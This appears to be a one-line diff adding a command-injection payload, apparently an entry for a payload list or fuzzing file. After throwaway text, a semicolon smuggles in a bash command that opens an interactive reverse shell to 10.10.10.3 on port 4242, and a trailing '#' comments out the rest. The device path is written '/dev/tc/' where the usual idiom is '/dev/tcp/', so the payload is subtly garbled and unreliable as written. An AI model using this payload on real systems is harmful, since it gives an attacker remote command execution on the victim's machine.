@@ -1,0 +1,1 @@
+a a ;/bin/bash -c 'bash -i >& /dev/tc/10.10.10.3/4242 0<&1' #
